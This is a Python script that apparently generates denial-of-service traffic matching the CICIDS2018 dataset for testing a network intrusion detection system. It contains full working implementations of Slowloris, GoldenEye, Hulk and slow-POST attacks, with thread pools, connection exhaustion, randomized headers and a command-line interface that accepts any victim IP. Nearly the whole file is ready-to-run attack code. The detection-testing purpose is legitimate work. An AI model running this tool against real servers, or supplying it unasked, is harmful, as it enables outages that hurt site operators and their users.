"""
DoS Attack — Combined All Variations (Run on Attacker VM)

Combines all 4 DoS methods from the CICIDS2018 dataset into one script.
When you run this for N seconds, it cycles through all methods,
giving each a time slice so the NIDS sees all DoS traffic patterns.

Methods (matching dataset exactly):
  1. Slowloris       — Slow incomplete HTTP headers (low bandwidth, stealthy)
  2. GoldenEye       — HTTP Keep-Alive + random headers flood
  3. Hulk            — Randomized unique HTTP GET flood (high bandwidth)
  4. SlowHTTPTest    — Slow POST body (R-U-Dead-Yet style)

Usage:
  python3 dos_attack.py --target 172.31.69.25 --duration 60
  python3 dos_attack.py --target 172.31.69.25 --port 80 --duration 120
  python3 dos_attack.py --target 172.31.69.25 --duration 60 --method slowloris  # single method
"""

import argparse
import threading
import time
import socket
import random
import string
import sys
import os

# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_PORT = 80
DEFAULT_DURATION = 60  # seconds

# How to split time across methods (equal slices)
# Each method runs for (total_duration / num_methods) seconds
METHODS = ["slowloris", "goldeneye", "hulk", "slowhttptest"]

# User agents from real browsers (matching dataset's randomized approach)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edge/16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 Chrome/61.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/60.0.3112.113",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.reddit.com/",
    "https://www.facebook.com/",
]


# ============================================================
# COLOR OUTPUT
# ============================================================

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"


def log(msg, color=CYAN):
    ts = time.strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{RESET}")


# ============================================================
# METHOD 1: SLOWLORIS
# Sends partial HTTP headers to keep connections open.
# Exactly matches dataset: slow headers, periodic keep-alive bytes.
# ============================================================

class SlowlorisAttack:
    """Slowloris DoS — incomplete HTTP headers keep connections alive."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.sockets = []
        self.socket_count = 200  # number of connections to maintain

    def _create_socket(self):
        """Create a TCP socket and send initial partial HTTP headers."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target, self.port))
            # Send partial HTTP request (never completed)
            ua = random.choice(USER_AGENTS)
            s.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())
            return s
        except Exception:
            return None

    def run(self):
        """Run Slowloris for the configured duration."""
        log(f"[SLOWLORIS] Starting — {self.socket_count} connections to {self.target}:{self.port}")

        # Initial connection burst
        for _ in range(self.socket_count):
            s = self._create_socket()
            if s:
                self.sockets.append(s)

        log(f"[SLOWLORIS] Established {len(self.sockets)} initial connections")

        end_time = time.time() + self.duration
        while time.time() < end_time:
            # Send keep-alive headers to maintain connections
            for s in list(self.sockets):
                try:
                    # Send a partial header to keep connection alive (exactly like original)
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                except Exception:
                    self.sockets.remove(s)
                    # Replace dead connection
                    new_s = self._create_socket()
                    if new_s:
                        self.sockets.append(new_s)

            time.sleep(0.5)  # Send keep-alive every 0.5s

        # Cleanup
        for s in self.sockets:
            try:
                s.close()
            except Exception:
                pass

        log(f"[SLOWLORIS] Finished — maintained {len(self.sockets)} connections")


# ============================================================
# METHOD 2: GOLDENEYE
# HTTP Keep-Alive + random headers, mimicking browser behavior.
# Matches dataset: concurrent connections with random User-Agents.
# ============================================================

class GoldenEyeAttack:
    """GoldenEye DoS — HTTP Keep-Alive flood with random headers."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = 10
        self.stop_event = threading.Event()

    def _worker(self):
        """Single worker thread — opens connections and sends HTTP requests with keep-alive."""
        while not self.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))

                # Send HTTP request with Keep-Alive (matching GoldenEye behavior)
                ua = random.choice(USER_AGENTS)
                path = f"/?{''.join(random.choices(string.ascii_lowercase, k=8))}={random.randint(0, 99999)}"
                referer = random.choice(REFERERS) + ''.join(random.choices(string.ascii_lowercase, k=5))

                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Referer: {referer}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(request.encode())

                # Keep the connection alive — send another request after a delay
                time.sleep(random.uniform(0.1, 0.5))

                # Send partial follow-up to keep connection busy
                for _ in range(random.randint(2, 5)):
                    if self.stop_event.is_set():
                        break
                    path2 = f"/?{''.join(random.choices(string.digits, k=10))}"
                    follow = (
                        f"GET {path2} HTTP/1.1\r\n"
                        f"Host: {self.target}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    s.send(follow.encode())
                    time.sleep(random.uniform(0.05, 0.3))

                s.close()
            except Exception:
                pass

    def run(self):
        """Run GoldenEye for the configured duration."""
        log(f"[GOLDENEYE] Starting — {self.threads} threads to {self.target}:{self.port}")

        self.stop_event.clear()
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        # Wait for duration
        time.sleep(self.duration)
        self.stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[GOLDENEYE] Finished — {self.threads} threads completed")


# ============================================================
# METHOD 3: HULK
# Sends unique randomized HTTP GET requests to defeat caching.
# Matches dataset: each request has random URL params, headers.
# ============================================================

class HulkAttack:
    """Hulk DoS — unique randomized HTTP GET flood."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = 10
        self.stop_event = threading.Event()
        self.request_count = 0

    def _random_params(self):
        """Generate random URL parameters (matching Hulk behavior)."""
        param_count = random.randint(1, 3)
        params = []
        for _ in range(param_count):
            key = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
            value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
            params.append(f"{key}={value}")
        return "&".join(params)

    def _worker(self):
        """Single worker — sends unique GET requests as fast as possible."""
        while not self.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))

                # Every request is UNIQUE (Hulk's signature behavior)
                params = self._random_params()
                ua = random.choice(USER_AGENTS)
                referer = random.choice(REFERERS) + ''.join(random.choices(string.ascii_lowercase, k=5))

                # Random accept-encoding (Hulk randomizes everything)
                encodings = random.choice(["gzip, deflate", "gzip", "deflate", "identity", "*"])
                charset = random.choice(["utf-8", "ISO-8859-1", "windows-1251", "ISO-8859-2"])

                request = (
                    f"GET /?{params} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,*/*;q={random.uniform(0.5, 0.9):.1f}\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: {encodings}\r\n"
                    f"Accept-Charset: {charset}\r\n"
                    f"Referer: {referer}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                s.send(request.encode())
                self.request_count += 1

                # Read response (to complete the flow and generate backward packets)
                try:
                    s.recv(4096)
                except Exception:
                    pass
                s.close()
            except Exception:
                pass

    def run(self):
        """Run Hulk for the configured duration."""
        log(f"[HULK] Starting — {self.threads} threads flooding {self.target}:{self.port}")

        self.stop_event.clear()
        self.request_count = 0
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        time.sleep(self.duration)
        self.stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[HULK] Finished — sent {self.request_count} unique requests")


# ============================================================
# METHOD 4: SLOWHTTPTEST (Slow POST / R-U-Dead-Yet)
# Sends HTTP POST with large Content-Length, body sent 1 byte at a time.
# Matches dataset: SlowHTTPTest slow POST mode.
# ============================================================

class SlowHTTPTestAttack:
    """SlowHTTPTest DoS — slow POST body (R-U-Dead-Yet)."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.num_connections = 100

    def _slow_post_worker(self, stop_event):
        """Single slow POST connection."""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target, self.port))

                # Send POST with large Content-Length
                content_length = random.randint(10000, 100000)
                ua = random.choice(USER_AGENTS)
                request = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(request.encode())

                # Send body one byte at a time, very slowly
                bytes_sent = 0
                while not stop_event.is_set() and bytes_sent < content_length:
                    byte = random.choice(string.ascii_lowercase).encode()
                    try:
                        s.send(byte)
                        bytes_sent += 1
                    except Exception:
                        break
                    # Very slow send — 1 byte every 0.1-0.5 seconds (matching SlowHTTPTest)
                    time.sleep(random.uniform(0.1, 0.5))

                s.close()
            except Exception:
                if not stop_event.is_set():
                    time.sleep(0.5)

    def run(self):
        """Run Slow POST for the configured duration."""
        log(f"[SLOWHTTPTEST] Starting — {self.num_connections} slow POST connections to {self.target}:{self.port}")

        stop_event = threading.Event()
        workers = []
        for _ in range(self.num_connections):
            t = threading.Thread(target=self._slow_post_worker, args=(stop_event,), daemon=True)
            t.start()
            workers.append(t)

        time.sleep(self.duration)
        stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[SLOWHTTPTEST] Finished — {self.num_connections} slow POST connections done")


# ============================================================
# COMBINED RUNNER — cycles through all methods
# ============================================================

def run_combined_dos(target, port, duration, method=None):
    """
    Run DoS attack. If method is None, cycles through ALL methods
    giving each an equal time slice (like LABEL_MAPPING combines
    DoS-Hulk, DoS-Slowloris, etc. into 'DoS').

    If method is specified, runs only that method for the full duration.
    """
    print()
    print("=" * 65)
    print(f"  DoS ATTACK — {'ALL VARIATIONS' if method is None else method.upper()}")
    print(f"  Target: {target}:{port}")
    print(f"  Duration: {duration}s")
    print("=" * 65)

    attack_classes = {
        "slowloris": SlowlorisAttack,
        "goldeneye": GoldenEyeAttack,
        "hulk": HulkAttack,
        "slowhttptest": SlowHTTPTestAttack,
    }

    if method:
        # Single method
        methods_to_run = [method]
    else:
        # All methods, cycled within the duration
        methods_to_run = METHODS

    # Calculate time per method
    time_per_method = duration / len(methods_to_run)
    log(f"Running {len(methods_to_run)} method(s), {time_per_method:.1f}s each")

    start_time = time.time()

    for i, method_name in enumerate(methods_to_run):
        elapsed = time.time() - start_time
        remaining = duration - elapsed
        if remaining <= 0:
            break

        method_duration = min(time_per_method, remaining)
        attack_cls = attack_classes.get(method_name)
        if not attack_cls:
            log(f"Unknown method: {method_name}", RED)
            continue

        log(f"--- Phase {i + 1}/{len(methods_to_run)}: {method_name.upper()} ({method_duration:.0f}s) ---", YELLOW)
        attack = attack_cls(target, port, method_duration)
        attack.run()
        print()

    total_time = time.time() - start_time
    print("=" * 65)
    log(f"DoS ATTACK COMPLETE — Total: {total_time:.1f}s", GREEN)
    print("=" * 65)


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="DoS Attack — All CICIDS2018 variations combined",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Methods:
  slowloris     — Slow incomplete HTTP headers (low bandwidth)
  goldeneye     — HTTP Keep-Alive + random headers flood
  hulk          — Unique randomized HTTP GET flood (high bandwidth)
  slowhttptest  — Slow POST body / R-U-Dead-Yet

Examples:
  python3 dos_attack.py --target 172.31.69.25 --duration 60
  python3 dos_attack.py --target 172.31.69.25 --duration 120 --method hulk
        """
    )

    parser.add_argument("--target", "-t", required=True, help="Victim IP address")
    parser.add_argument("--port", "-p", type=int, default=DEFAULT_PORT, help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--duration", "-d", type=int, default=DEFAULT_DURATION, help=f"Total duration in seconds (default: {DEFAULT_DURATION})")
    parser.add_argument("--method", "-m", choices=METHODS, default=None, help="Run only this method (default: all combined)")

    args = parser.parse_args()
    run_combined_dos(args.target, args.port, args.duration, args.method)


if __name__ == "__main__":
    main()
